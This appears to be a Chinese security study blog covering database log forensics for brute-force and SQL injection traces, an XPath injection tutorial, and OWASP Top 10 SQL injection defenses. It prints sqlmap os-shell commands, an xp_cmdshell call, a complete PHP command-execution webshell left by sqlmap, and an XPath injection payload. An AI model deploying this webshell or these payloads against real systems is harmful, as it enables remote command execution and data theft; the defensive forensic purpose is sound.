双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003329189.png" alt="" loading="lazy"><br>
另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003334603.png" alt="" loading="lazy"><br>
日志分析案例：</p>
<p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003339349.png" alt="" loading="lazy"><br>
筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p>
<p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003344900.png" alt="" loading="lazy"></p>
<h3 id="0x02-sql注入入侵痕迹">0x02  SQL注入入侵痕迹</h3>
<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：</p>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、数据库表检查</p>
<p>2、检查xp_cmdshell等存储过程</p>
<p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p>
<p>`Exec master.dbo.xp_cmdshell 'whoami'</p>
<p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>
<h1 id="mysql日志分析">MySQL日志分析</h1>
<p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-mysql日志分析">0x01 Mysql日志分析</h3>
<p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p>
<pre><code>1、查看log配置信息
show variables like '%general%';
2、开启日志
SET GLOBAL general_log = 'On';
3、指定日志文件路径
#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';
</code></pre>
<p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p>
<pre><code>190604 14:46:14       14 Connect    root@localhost on 
           14 Init DB    test
           14 Query    SELECT * FROM admin WHERE id = 1
           14 Quit  `
</code></pre>
<p>我们按列来解析一下：</p>
<pre><code>第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。
第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。
第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。
第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。
</code></pre>
<h3 id="0x02-登录成功失败">0x02 登录成功/失败</h3>
<p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003459915.png" alt="" loading="lazy"><br>
MySQL中的log记录是这样子：</p>
<pre><code>Time                 Id        Command         Argument

190601 22:03:20	   98 Connect	root@192.168.204.1 on 
		   98 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  103 Connect	mysql@192.168.204.1 on 
		  103 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  104 Connect	mysql@192.168.204.1 on 
		  104 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Connect	root@192.168.204.1 on 
		  101 Connect	root@192.168.204.1 on 
		  101 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		   99 Connect	root@192.168.204.1 on 
		   99 Connect	Access denied for user 'root'@'192.168.204.1' (using password: YES)
		  105 Connect	mysql@192.168.204.1 on 
		  105 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Query	set autocommit=0
		  102 Connect	mysql@192.168.204.1 on 
		  102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
		  100 Quit	`
</code></pre>
<p>你知道在这个口令猜解过程中，哪个是成功的吗？</p>
<p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p>
<pre><code>190601 22:03:20     100 Connect	root@192.168.204.1 on 
	   100 Query	set autocommit=0
	   100 Quit
</code></pre>
<p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p>
<p>Navicat for MySQL登录：</p>
<pre><code>190601 22:14:07	  106 Connect	root@192.168.204.1 on 
		         106 Query	SET NAMES utf8
		         106 Query	SHOW VARIABLES LIKE 'lower_case_%'
		         106 Query	SHOW VARIABLES LIKE 'profiling'
		         106 Query	SHOW DATABASES
</code></pre>
<p>命令行登录：</p>
<pre><code>190601 22:17:25	  111 Connect	root@localhost on 
		         111 Query	select @@version_comment limit 1
190601 22:17:56	  111 Quit
</code></pre>
<p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p>
<p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p>
<p>登录失败的记录：</p>
<pre><code>102 Connect	mysql@192.168.204.1 on 
102 Connect	Access denied for user 'mysql'@'192.168.204.1' (using password: YES)
</code></pre>
<p>利用shell命令进行简单的分析：</p>
<pre><code>#有哪些IP在爆破？
grep  &quot;Access denied&quot; mysql.log |cut -d &quot;'&quot; -f4|uniq -c|sort -nr
     27 192.168.204.1

#爆破用户名字典都有哪些？
grep  &quot;Access denied&quot; mysql.log |cut -d &quot;'&quot; -f2|uniq -c|sort -nr
     13 mysql
     12 root
      1 root
      1 mysql

</code></pre>
<p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p>
<p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p>
<h3 id="0x03-sql注入入侵痕迹">0x03  SQL注入入侵痕迹</h3>
<p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的--os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p>
<p>1、构造一个SQL注入点，开启Burp监听8080端口</p>
<p><code>sqlmap.py -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p>
<p>HTTP通讯过程如下：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003489782.png" alt="" loading="lazy"><br>
创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p>
<pre><code>tmpbwyov.php：

&lt;?php $c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c.&quot; 2&gt;&amp;1\n&quot;;function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print &quot;&lt;pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;`
</code></pre>
<p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p>
<p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p>
<p>检查方法：</p>
<p>1、检查网站目录下，是否存在一些木马文件：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627003524540.png" alt="" loading="lazy"><br>
2、检查是否有UDF提权、MOF提权痕迹</p>
<p>检查目录是否有异常文件</p>
<p>mysql\lib\plugin</p>
<p>c:/windows/system32/wbem/mof/</p>
<p>检查函数是否删除</p>
<pre><code>`select * from mysql.func`
</code></pre>
<p>3、结合web日志分析。</p>
<h1 id="2021-07-23">2021-07-23</h1>
<h1 id="windows权限维持-隐藏篇">Windows权限维持--隐藏篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120176342.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120181835.png" alt="" loading="lazy"></p>
<h1 id="windows权限维持-后门篇">Windows权限维持--后门篇</h1>
<figure data-type="image" tabindex="23"><img src="https://jinqipiaopiao.github.io//post-images/1627120207491.png" alt="" loading="lazy"></figure>
<h1 id="第3篇linux权限维持-隐藏篇">第3篇：Linux权限维持--隐藏篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120228492.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120232518.png" alt="" loading="lazy"></p>
<h1 id="第4篇linux权限维持-后门篇">第4篇：Linux权限维持--后门篇</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120248943.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120253486.png" alt="" loading="lazy"></p>
<h1 id="第5篇三大渗透测试框架权限维持技术">第5篇：三大渗透测试框架权限维持技术</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120275343.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120279732.png" alt="" loading="lazy"></p>
<h1 id="第6篇常见webshell管理工具">第6篇：常见WebShell管理工具</h1>
<p><img src="https://jinqipiaopiao.github.io//post-images/1627120299125.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1627120303339.png" alt="" loading="lazy"></p>
<h1 id="windows实战篇">Windows实战篇</h1>
<h1 id="第1篇ftp暴力破解">第1篇：FTP暴力破解</h1>
<figure data-type="image" tabindex="24"><img src="https://jinqipiaopiao.github.io//post-images/1627120628024.png" alt="" loading="lazy"></figure>
<h1 id="第2篇蠕虫病毒">第2篇：蠕虫病毒</h1>
<figure data-type="image" tabindex="25"><img src="https://jinqipiaopiao.github.io//post-images/1627120632018.png" alt="" loading="lazy"></figure>
<h1 id="第3篇勒索病毒">第3篇：勒索病毒</h1>
<figure data-type="image" tabindex="26"><img src="https://jinqipiaopiao.github.io//post-images/1627120635115.png" alt="" loading="lazy"></figure>
<h1 id="第4篇arp病毒">第4篇：ARP病毒</h1>
<figure data-type="image" tabindex="27"><img src="https://jinqipiaopiao.github.io//post-images/1627120638238.png" alt="" loading="lazy"></figure>
<h1 id="第5篇挖矿病毒一">第5篇：挖矿病毒（一）</h1>
<figure data-type="image" tabindex="28"><img src="https://jinqipiaopiao.github.io//post-images/1627120642365.png" alt="" loading="lazy"></figure>
<h1 id="第6篇挖矿病毒二">第6篇：挖矿病毒（二）</h1>
<figure data-type="image" tabindex="29"><img src="https://jinqipiaopiao.github.io//post-images/1627120646969.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-24">2021-07-24</h1>
<h1 id="linux实战篇">Linux实战篇</h1>
<h1 id="第1篇ssh暴力破解">第1篇：SSH暴力破解</h1>
<figure data-type="image" tabindex="30"><img src="https://jinqipiaopiao.github.io//post-images/1627121171992.png" alt="" loading="lazy"></figure>
<h1 id="第2篇捕捉短连接">第2篇：捕捉短连接</h1>
<figure data-type="image" tabindex="31"><img src="https://jinqipiaopiao.github.io//post-images/1627121175260.png" alt="" loading="lazy"></figure>
<h1 id="第3篇挖矿病毒">第3篇：挖矿病毒</h1>
<figure data-type="image" tabindex="32"><img src="https://jinqipiaopiao.github.io//post-images/1627121178896.png" alt="" loading="lazy"></figure>
<h1 id="第4篇盖茨木马">第4篇：盖茨木马</h1>
<figure data-type="image" tabindex="33"><img src="https://jinqipiaopiao.github.io//post-images/1627121183106.png" alt="" loading="lazy"></figure>
<h1 id="第5篇ddos病毒">第5篇：DDOS病毒</h1>
<figure data-type="image" tabindex="34"><img src="https://jinqipiaopiao.github.io//post-images/1627121189128.png" alt="" loading="lazy"></figure>
<h1 id="web实战篇">Web实战篇</h1>
<h1 id="第1篇网站被植入webshell">第1篇：网站被植入Webshell</h1>
<figure data-type="image" tabindex="35"><img src="https://jinqipiaopiao.github.io//post-images/1627121200218.png" alt="" loading="lazy"></figure>
<h1 id="第3篇批量挂黑页">第3篇：批量挂黑页</h1>
<figure data-type="image" tabindex="36"><img src="https://jinqipiaopiao.github.io//post-images/1627121205029.png" alt="" loading="lazy"></figure>
<h1 id="第4篇新闻源网站劫持">第4篇：新闻源网站劫持</h1>
<figure data-type="image" tabindex="37"><img src="https://jinqipiaopiao.github.io//post-images/1627121210180.png" alt="" loading="lazy"></figure>
<h1 id="第5篇移动端劫持">第5篇：移动端劫持</h1>
<figure data-type="image" tabindex="38"><img src="https://jinqipiaopiao.github.io//post-images/1627121214432.png" alt="" loading="lazy"></figure>
<h1 id="第6篇搜索引擎劫持">第6篇：搜索引擎劫持</h1>
<figure data-type="image" tabindex="39"><img src="https://jinqipiaopiao.github.io//post-images/1627121218635.png" alt="" loading="lazy"></figure>
<h1 id="第7篇网站首页被篡改">第7篇：网站首页被篡改</h1>
<figure data-type="image" tabindex="40"><img src="https://jinqipiaopiao.github.io//post-images/1627121223338.png" alt="" loading="lazy"></figure>
<h1 id="第8篇管理员账号被篡改">第8篇：管理员账号被篡改</h1>
<figure data-type="image" tabindex="41"><img src="https://jinqipiaopiao.github.io//post-images/1627121227307.png" alt="" loading="lazy"></figure>
<h1 id="第9篇编辑器入侵事件">第9篇：编辑器入侵事件</h1>
<figure data-type="image" tabindex="42"><img src="https://jinqipiaopiao.github.io//post-images/1627121232740.png" alt="" loading="lazy"></figure>
<h1 id="2021-07-27">2021-07-27</h1>
<p>#XPath注入漏洞实战</p>
<p>0x00 什么是XPath<br>
XPath是W3C的一个标准。它最主要的目的是为了在XML1.0或XML1.1文档节点树中定位节点所设计。</p>
<p>目前有XPath1.0和XPath2.0两个版本。</p>
<p>XPath1.0<br>
Xpath1.0是1999年成为W3C标准，而XPath2.0标准的确立是在2007年。</p>
<p>XPath是一种表达式语言，它的返回值可能是节点，节点集合，原子值，以及节点和原子值的混合等。</p>
<p>Xpath2.0<br>
XPath2.0是XPath1.0的超集。</p>
<p>它是对XPath1.0的扩展，它可以支持更加丰富的数据类型，并且XPath2.0保持了对XPath1.0的相对很好的向后兼容性，几乎所有的XPath2.0的返回结果都可以和XPath1.0保持一样。</p>
<p>XPath 1.0 和 XPath 2.0 之间的区别包括：</p>
<p>基于序列而非节点集的新的数据模型<br>
绑定变量的能力，以前的变量绑定在宿主语言（XSLT）中<br>
完全支持 XML Schema 数据类型<br>
很多新功能，包括正则表达式、日期/时间和字符串操作<br>
注释，虽然不是一个重要的特性，但是在调试查询时很方便：测试时可以注释掉路径的一部分<br>
具体案例如下，由于开发水平有限，用的也比较少，写起来实在蛋疼，这里就不多写了。</p>
<p>https://www.ibm.com/developerworks/cn/xml/x-wxxm35.html</p>
<p>0x01 Xpath表达式语法<br>
XPath 使用路径表达式来选取XML文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。</p>
<p>路径<br>
位置路径可以是绝对的，也可以是相对的。</p>
<p>绝对路径起始于正斜杠( / )，而相对路径不会这样。</p>
<p>在两种情况中，位置路径均包括一个或多个步，每个步均被斜杠分割：</p>
<p>一种是绝对路径<br>
/step/step/...</p>
<p>一种是相对路径<br>
step/step/...</p>
<p>步<br>
步(step)有以下几种</p>
<p>名称	定义<br>
轴（axis）	定义所选节点与当前节点之间的树关系<br>
节点测试（node-test）	识别某个轴内部的节点<br>
谓语（predicate）	更深入地提炼所选的节点集<br>
step的语法：</p>
<pre><code>轴名称::节点测试[谓语]
</code></pre>
<p>常见轴的名称<br>
轴可定义相对于当前节点的节点集。</p>
<p>轴名称	结果<br>
ancestor	选取当前节点的所有先辈（父、祖父等）。<br>
ancestor-or-self	选取当前节点的所有先辈（父、祖父等）以及当前节点本身。<br>
attribute	选取当前节点的所有属性。<br>
child	选取当前节点的所有子元素。<br>
descendant	选取当前节点的所有后代元素（子、孙等）。<br>
descendant-or-self	选取当前节点的所有后代元素（子、孙等）以及当前节点本身。<br>
following	选取文档中当前节点的结束标签之后的所有节点。<br>
namespace	选取当前节点的所有命名空间节点。<br>
parent	选取当前节点的父节点。<br>
preceding	选取文档中当前节点的开始标签之前的所有节点。<br>
preceding-sibling	选取当前节点之前的所有同级节点。<br>
self	选取当前节点。<br>
谓词（筛选表达式）<br>
XPath的谓词即筛选表达式，类似于SQL的where子句。</p>
<p>运算符/特殊字符	说明<br>
/	此路径运算符出现在模式开头时，表示应从根节点选择。<br>
//	从当前节点开始递归下降，此路径运算符出现在模式开头时，表示应从根节点递归下降。<br>
.	当前上下文。<br>
…	当前上下文节点父级。</p>
<ul>
<li>通配符；选择所有元素节点与元素名无关。（不包括文本，注释，指令等节点，如果也要包含这些节点请用node()函数）<br>
@	属性名的前缀。<br>
@*	选择所有属性，与名称无关。<br>
:	命名空间分隔符；将命名空间前缀与元素名或属性名分隔。<br>
( )	括号运算符(优先级最高)，强制运算优先级。<br>
[ ]	应用筛选模式（即谓词，包括&quot;过滤表达式&quot;和&quot;轴（向前/向后）&quot;）。<br>
|	两个节点集合的联合</li>
</ul>
<ul>
<li>
<p>减法。<br>
div	浮点除法。<br>
and, or	逻辑运算。<br>
mod	求余。<br>
not()	逻辑非<br>
=	等于<br>
!=	不等于<br>
&lt; ，&gt;，&gt;=，&lt;=	特殊比较运算符<br>
0x02 XPath学习测试<br>
XML 实例文档</p>
<data>
<users>
	<user>
		<name id='1'>hacker</name>
		<message>Hello hacker</message>
		<password>cisco123</password>
	</user>
	<user>
		<name id='2'>admin</name>
		<message>Hello admin</message>
		<password>s3cr3tP4ssw0rd</password>
	</user>
</users>
</data>
</li>
</ul>
<p>PHP代码<br>
//$x为上面的xml代码</p>
<pre><code>&lt;?php
$xml=simplexml_load_string($x);
$xpath = $_POST['name'];
print $xpath.&quot;&lt;hr&gt;&quot;;
$res = ($xml-&gt;xpath($xpath));
print_r($res);
}
?&gt;
</code></pre>
<p>测试用例<br>
选择文档根下面的所有元素节点，即根节点（XML文档只有一个根节点）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375527202.png" alt="" loading="lazy"><br>
user下所有的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375530529.png" alt="" loading="lazy"><br>
user下的第一个节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375533768.png" alt="" loading="lazy"><br>
user下的最后一个节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375536933.png" alt="" loading="lazy"><br>
users下的第一个节点递归下降查找所有的文本节点（无限深度）<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375540523.png" alt="" loading="lazy"><br>
第一个users节点下的所有子节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375544113.png" alt="" loading="lazy"><br>
user节点下name为admin的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375547891.png" alt="" loading="lazy"><br>
user节点下name的属性名为id，且为1的节点<br>
<img src="https://jinqipiaopiao.github.io//post-images/1627375551247.png" alt="" loading="lazy"><br>
了解得差不多了，就不在继续了，暂时够用了。</p>
<p>XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的语言。</p>
<p>//   	从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置<br>
//*	选取文档中的所有元素。<br>
']   	为闭合前面的节点<br>
|  	为分别执行，符号前后的路径都要查询<br>
//* 	为匹配所有节点<br>
//*[' 	为匹配后面的内容<br>
所以上面构造的链接：</p>
<pre><code>/demo.php?name=xml']|//*|//*['
</code></pre>
<p>意思应该是，执行了三次查询。分别是执行查找值为xml的元素，执行选取文档中的所有元素，执行值为空的选取文档中的所有元素。</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「吃肉唐僧」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_39936434/article/details/95471774<br>
————————————————<br>
版权声明：本文为CSDN博主「baynk」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/u014029795/article/details/105459096</p>
<h1 id="2021-08-07">2021-08-07</h1>
<p>OWASP TOP 10-2010<br>
开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。其目的是协助个人、企业和机构来发现和使用可信赖软件。<br>
OWASP发布了最新的Web应用脆弱性的top 10，这是继2007年OWASP对TOP10进行修订后进行的又一次更改，该版本暂定为OWASP TOP 10 - 2010。新版本的OWASP TOP10中主要有以下变化：<br>
1.Top10的命名发生了变化。<br>
原先的Top10全称为“The top 10 most critical web application security vulnerabilities”，即“Web应用的十大关键脆弱性”，现在Top10的全称为“The top 10 most critical web application security risks”，即“Web应用的十大关键风险”。<br>
2.OWASP Top 10的风险评估方法<br>
此次Top 10的评估是依据OWASP的风险评估方法来对OWASP TOP10排序的。<br>
3.替换了2个风险<br>
此次Top 10与2007年的Top 10相比，　在内容上去掉了“Malicious File Execution”(恶意文件执行)和“Information leakage and improper error handling”(信息泄露及不恰当的错误处理)，增加了“Security misconfiguration”(错误安全配置)和“Unvalidated redirects and forwards”(未验证的重定向和传递)。</p>
<p>** OWASP TOP10 2007	 OWASP TOP10 2010**<br>
A2-注入	 A1-注入<br>
A1-跨站脚本（XSS）	 A2-跨站脚本（XSS）<br>
A7-错误的认证和会话管理	 A3-错误的认证和会话管理<br>
A4-不正确的直接对象引用	 A4-不正确的直接对象引用<br>
A5-伪造跨站请求（CSRF）	 A5-伪造跨站请求（CSRF）<br>
A6-安全性误配置<br>
A10-限制远程访问失败	 A7-限制远程访问失败<br>
A8-未验证的重定向和传递<br>
A8-不安全的加密存储	 A9-不安全的加密存储<br>
A9-不足的传输层保护	 A10-不足的传输层保护<br>
A3-恶意文件执行	<br>
A6-不安全的通讯</p>
<p><strong>OWASP风险评估方法</strong><br>
OWASP所选取的10大风险是依据OWASP的风险评估方法，我们从标准的风险模型开始，即风险=可能性*后果，下面我们以以下步骤来说明某个风险的严重程度：<br>
第一步：识别风险<br>
识别风险作为评估的第一步，我们必须找到与这个风险相关的威胁、相应的攻击方法、隐含在里面的脆弱性以及最终可能造成的后果，当然可能存在多种攻击方法和多种后果，在评估时我们往往会采用最坏选择，这样就能更客观的反应该风险的最终评级；<br>
第二步：考虑影响可能性的因素<br>
通常，我们不可能很精准的说出某个风险的可能性数值，所以我们一般用高、中、低来表示，而且影响某个风险的可能性的因素有很多，对于每个因素我们用0到9的数值来表示。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303620083.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303650868.png" alt="" loading="lazy"><br>
第三步：考虑影响后果的因素<br>
在考虑攻击后果的时候，我们会考虑两种后果，一种是应用的“技术后果”，它所使用的数据，提供的功能等等，另一种就是它的“商业后果”，显然后者则更为重要，但往往后者难以估量，所以我们需要尽可能从技术上去考虑，进而来估计后者的数据。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303676539.png" alt="" loading="lazy"><br>
<strong>A1-注入</strong><br>
注入往往是应用程序缺少对输入进行安全性检查所引起的，攻击者把一些包含指令的数据发送给解释器，解释器会把收到的数据转换成指令执行。常见的注入包括SQL注入，OS Shell，LDAP，XPath，Hibernate等等，其中SQL注入尤为常见。这种攻击所造成的后果往往很大，一般整个数据库的信息都能被读取或篡改，通过SQL注入，攻击者甚至能够获得更多的包括管理员的权限。<br>
防范SQL注入——编程篇<br>
SQL注入往往是在程序员编写包含用户输入的动态数据库查询时产生的，但其实防范SQL注入的方法非常简单。程序员只要a）不再写动态查询，或b）防止用户输入包含能够破坏查询逻辑的恶意SQL语句，就能够防范SQL注入。在这篇文章中，我们将会说明一些非常简单的防止SQL注入的方法。<br>
　　我们用以下Java代码作为示例：</p>
<pre><code>String query =＂SELECT account_balance FROM user_data WHERE user_name =＂
+request.getParameter(＂customerName＂);

try {
Statement statement = connection.createStatement( …);
ResultSet results = Statement.executeQuery(query);
}
</code></pre>
<p>在以上代码中，我们可以看到并未对变量customerName做验证，customerName的值可以直接附在query语句的后面传送到数据库执行，则攻击者可以将任意的SQL语句注入。<br>
　**　防范方法1：参数化查询**<br>
　　参数化查询是所有开发人员在做数据库查询时首先需要学习的，参数化查询迫使所有开发者首先要定义好所有的SQL代码，然后再将每个参数逐个传入，这种编码风格就能够让数据库辨明代码和数据。<br>
　　参数化查询能够确保攻击者无法改变查询的内容，在下面修正过的例子中，如果攻击者输入了UsrID是    “’or ‘1 ‘=’1”，参数化查询会去查找一个完全满足名字为‘or ‘1 ‘=’ 1的用户。<br>
　　对于不同编程语言，有一些不同的建议：<br>
　　Java EE——使用带绑定变量的PreparedStatement()；<br>
　　.Net——使用带绑定变量的诸如SqlCommand()或OleDbCommand()的参数化查询；<br>
　　PHP——使用带强类型的参数化查询PDO（使用bindParam()）；<br>
　　Hibernate——使用带绑定变量的createQuery()。<br>
　　<br>
Java示例：<br>
String custname = request.getParameter(＂customerName＂);<br>
String query =＂SELECT account_balance FROM user_data WHERE user_name= ?＂;</p>
<pre><code>PreparedStatement pstmt = connection.prepareStatement(query);
Pstmt.setString(1,custname);
ResultSet results = pstmt.executeQuery();
　　C# .Net示例：
String query =＂SELECT account_balance FROM user_data WHERE user_name = ?＂;
Try {    
　　　OleDbCommand command = new OleDbCommand(query,connection);
　　　command.Parameters.Add(new OleDbParameter(＂customerName＂,CustomerName.Text));
　　　OleDbDataReader reader = command.ExecuteReader();
　　} catch (OleDbException se){
　　//error handling
}
</code></pre>
<p><strong>防范方法2：存储过程</strong><br>
　　存储过程和参数化查询的作用是一样的，唯一的不同在于存储过程是预先定义并存放在数据库中，从而被应用程序调用的。<br>
　　Java存储过程示例：</p>
<pre><code>String custname = request.getParameter(＂customerName＂);
try {
CallableStatement cs = connection.prepareCall(＂call sp_getAccountBalance(?)}＂);
cs.setString(1,custname);
Result results = cs.executeQuery();
}catch(SQLException se){
//error handling
}
</code></pre>
<p>VB .Net存储过程示例：</p>
<pre><code>Try
Dim command As SqlCommand = new SqlCommand(＂sp_getAccountBalance＂,connection)
command.CommandType = CommandType.StoredProcedure
command.Parameters.Add(new SqlParameter(＂@CustomerName＂,CustomerName.Text))
Dim reader As SqlDataReader = command.ExecuteReader()
‘…
Catch se As SqlException
‘error handling
End Try
</code></pre>
<p><strong>防范方法3：对所有用户输入进行转义</strong><br>
　　我们知道每个DBMS都有一个字符转义机制来告知DBMS输入的是数据而不是代码，如果我们将所有用户的输入都进行转义，那么DBMS就不会混淆数据和代码，也就不会出现SQL注入了。<br>
　　当然，如果要采用这种方法，那么你就需要对所使用的数据库转义机制，也可以使用现存的诸如OWASP ESAPI的escaping routines。ESAPI目前是基于MySQL和Oracle的转义机制的，使用起来也很方便。一个Oracle的ESAPI的使用示例如下：<br>
ESAPI.encoder().encodeForSQL(new OracleCodec(),queryparam);<br>
　　那么，假设你有一个要访问Oracle数据库的动态查询代码如下：</p>
<pre><code>String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂+req.getParameter(＂userID＂)+＂’ and user_password = ‘＂+req.getParameter(＂pwd＂)+＂’＂;
try {
Statement statement = connection.createStatement(…);
ResultSet results = statement.executeQuery(query) ;
}
</code></pre>
<p>那么，你就必须重写你的动态查询的第一行如下：</p>
<pre><code>Codec ORACLE_CODEC = new OracleCodec();
String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂+
ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter(＂userID＂))+＂’ and user_password = ‘＂+
ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter(＂pwd＂))+＂’＂;
　　当然，为了保证自己代码的可读性，我们也可以构建自己的OracleEncoder：
Encoder e = new OracleEncoder();
String query =＂SELECT user_id FROM user_data WHERE user_name = ‘＂
+oe.encode(req.getParameter(＂userID＂)) +＂’ and user_password = ‘＂   +oe.encode(req.getParameter(＂pwd＂))+＂’＂;
</code></pre>
<p>除了上面所说的三种防范方法以外，我们还建议可以用以下两种附加的方法来防范SQL注入：最小权限法、输入验证白名单法。<br>
　　最小权限法：<br>
　　为了避免注入攻击对数据库造成的损害，我们可以把每个数据库用户的权限尽可能缩小，不要把DBA或管理员的权限赋予你应用程序账户，在给用户权限时是基于用户需要什么样的权限，而不是用户不需要什么样的权限。当一个用户只需要读的权限时，我们就只给他读的权限，当用户只需要一张表的部分数据时，我们宁愿另建一个视图让他访问。<br>
